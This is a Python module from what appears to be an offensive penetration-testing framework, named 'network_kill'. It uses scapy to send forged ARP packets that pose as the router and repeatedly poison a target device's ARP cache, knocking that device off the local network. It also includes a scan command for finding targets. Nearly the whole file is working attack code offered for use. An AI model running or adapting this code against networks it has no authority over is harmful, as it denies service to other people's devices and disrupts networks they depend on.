#        Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)

from optparse import OptionParser
import os
import sys
import signal
from time import sleep
import logging
from scapy.all import *
from collections import OrderedDict
from core import bcolors
from core import network_scanner

#info about module
#modules name
modulename = "network_kill"
#version
version = "1.0"
#description
desc = "Kicks out target device from network with arp calls"
#created by
createdby = "4shadoww"
#creator's github
github = "4shadoww"
#email
email = "4shadoww0@gmail.com"

needroot = 1

#list
variables = OrderedDict((
('target', '192.168.1.2'),
('router', '192.168.1.1'),
))

#description for variables
vdesc = [
"target device's ip",
"router's ip",
]

#help for customcommands (remove if you will not use customcommands)
mhelp = OrderedDict((
('scan', 'scan for targets'),
))

#additional help notes
help_notes = bcolors.WARNING+"This module will not work without root permission!\n This will not work alway because some devices can refuse from arp request!"+bcolors.END

#custom commands
customcommands = (
'scan'
)

#simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	print(bcolors.OKBLUE + "[*] arp poisoning has been started!" + bcolors.END)
	print(bcolors.OKBLUE + "[*] ctrl + c to end" + bcolors.END)
	packet = ARP()
	packet.psrc = variables['router']
	packet.pdst = variables['target']
	while 1:
		send(packet, verbose=False)
		sleep(10)

def scan():
	network_scanner.scan()